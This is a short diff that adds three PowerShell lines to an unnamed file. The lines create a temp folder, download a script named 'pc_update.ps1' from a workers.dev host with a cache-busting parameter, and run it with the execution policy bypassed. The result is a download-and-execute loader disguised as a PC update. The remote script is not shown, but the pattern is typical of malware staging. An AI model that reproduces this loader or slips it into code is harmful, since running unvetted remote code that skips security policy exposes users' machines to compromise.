@@ -1,0 +1,3 @@
+$d = Join-Path $env:TEMP 'dsupd'; New-Item -ItemType Directory -Force -Path $d | Out-Null
+Invoke-WebRequest ('https://bonafide-portal.seoulgijibae.workers.dev/dongseon/bit/pc_update.ps1?t=' + [DateTime]::Now.Ticks) -OutFile (Join-Path $d 'pc_update.ps1') -UseBasicParsing
+powershell -NoProfile -ExecutionPolicy Bypass -File (Join-Path $d 'pc_update.ps1')
